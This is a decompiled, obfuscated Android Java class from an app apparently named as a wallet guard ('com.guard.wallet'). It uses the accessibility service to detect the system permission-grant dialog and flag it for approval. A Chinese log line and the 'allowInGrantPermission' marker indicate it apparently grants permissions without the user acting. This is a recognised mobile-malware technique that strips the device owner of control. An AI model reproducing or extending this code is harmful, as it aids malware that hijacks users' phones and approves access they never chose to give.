package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.req.ListenWindow;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;

public final class l extends e {
   public static final int o = 0;
   public final ConcurrentLinkedQueue n = new ConcurrentLinkedQueue();

   public l() {
      super(J(), "com.android.permissioncontroller");
   }

   public static ListenWindow H() {
      ListenWindow var0 = new ListenWindow(null, "com.android.packageinstaller.permission.ui.GrantPermissionsActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow I() {
      ListenWindow var0 = new ListenWindow(null, "com.android.permissioncontroller.permission.ui.GrantPermissionsActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static LinkedList J() {
      LinkedList var0 = new LinkedList();
      var0.add(H());
      var0.add(I());
      return var0;
   }

   @Override
   public final void d() {
      com.guard.wallet.thread.l.a(super.c);
      this.n.clear();
      super.d();
   }

   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      super.u(var1, var2, var3);
      LinkedList var5 = new LinkedList();
      var5.add(H());
      var5.add(I());
      boolean var4;
      if (this.q(var5)) {
         Log.d("o.l", "已进入是否允许权限申请窗口");
         var4 = true;
      } else {
         var4 = false;
      }

      if (var4) {
         ConcurrentLinkedQueue var6 = this.n;
         if (!var6.contains("allowInGrantPermission")) {
            var6.add("allowInGrantPermission");
            com.guard.wallet.thread.l.c(new a(this, 2), super.c);
         }
      }
   }
}
